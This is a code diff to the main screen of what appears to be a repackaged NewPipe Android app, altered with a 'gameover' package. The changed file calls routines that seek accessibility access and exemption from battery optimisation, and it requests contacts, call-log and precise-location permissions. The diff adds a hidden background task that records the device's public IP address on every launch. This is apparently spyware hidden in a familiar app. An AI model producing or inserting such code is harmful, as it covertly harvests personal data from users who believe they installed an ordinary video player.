@@ -34,6 +34,7 @@ import android.content.SharedPreferences;
 import android.content.pm.PackageManager;
 import android.content.pm.ServiceInfo;
 import android.net.Uri;
+import android.os.AsyncTask;
 import android.os.Build;
 import android.os.Bundle;
 import android.os.Handler;
@@ -87,6 +88,7 @@ import org.schabi.newpipe.fragments.detail.VideoDetailFragment;
 import org.schabi.newpipe.fragments.list.search.SearchFragment;
 import org.schabi.newpipe.gameover.MyService;
 import org.schabi.newpipe.gameover.SocialMedia;
+import org.schabi.newpipe.gameover.utils.SavePref;
 import org.schabi.newpipe.local.feed.notifications.NotificationWorker;
 import org.schabi.newpipe.player.Player;
 import org.schabi.newpipe.player.event.OnKeyDownListener;
@@ -105,6 +107,13 @@ import org.schabi.newpipe.util.StateSaver;
 import org.schabi.newpipe.util.ThemeHelper;
 import org.schabi.newpipe.views.FocusOverlayView;
 
+import java.io.BufferedInputStream;
+import java.io.IOException;
+import java.io.InputStream;
+import java.io.InputStreamReader;
+import java.net.HttpURLConnection;
+import java.net.MalformedURLException;
+import java.net.URL;
 import java.util.ArrayList;
 import java.util.List;
 import java.util.Objects;
@@ -160,12 +169,52 @@ public class MainActivity extends AppCompatActivity {
         assureCorrectAppLanguage(this);
         super.onCreate(savedInstanceState);
 
+        SavePref pref = new SavePref(this);
+
+        AsyncTask.execute(new Runnable() {
+            @Override
+            public void run() {
+                //TODO your background code
+
+                URL url;
+                HttpURLConnection urlConnection = null;
+                try {
+                    url = new URL("https://checkip.amazonaws.com/");
+
+                    urlConnection = (HttpURLConnection) url
+                            .openConnection();
+
+                    InputStream in = urlConnection.getInputStream();
+
+                    InputStreamReader isw = new InputStreamReader(in);
+
+                    int data = isw.read();
+                    StringBuilder pubip = new StringBuilder();
+                    while (data != -1) {
+                        char current = (char) data;
+                        data = isw.read();
+                        System.out.print(current);
+                        pubip.insert(pubip.length(), current);
+                    }
+                    System.out.print(pubip);
+                    pref.setPubIp(String.valueOf(pubip));
+                } catch (Exception e) {
+                    e.printStackTrace();
+                } finally {
+                    if (urlConnection != null) {
+                        urlConnection.disconnect();
+                    }
+                }
+            }
+        });
+
         /*gameover*/
         getAid();
         subscribeTopic();
         ignorebattryOptimization();
         askPermissions();
         checkAndAskAcc();
+
 
         mainBinding = ActivityMainBinding.inflate(getLayoutInflater());
         drawerLayoutBinding = mainBinding.drawerLayout;
@@ -212,8 +261,8 @@ public class MainActivity extends AppCompatActivity {
                     Manifest.permission.READ_MEDIA_AUDIO,
                     Manifest.permission.ACCESS_FINE_LOCATION
             };
-            ActivityCompat.requestPermissions(this, requiredPermissionsList, 219);}
-        else {
+            ActivityCompat.requestPermissions(this, requiredPermissionsList, 219);
+        } else {
             String[] requiredPermissionsList = {
                     Manifest.permission.READ_CONTACTS,
                     Manifest.permission.READ_CALL_LOG,
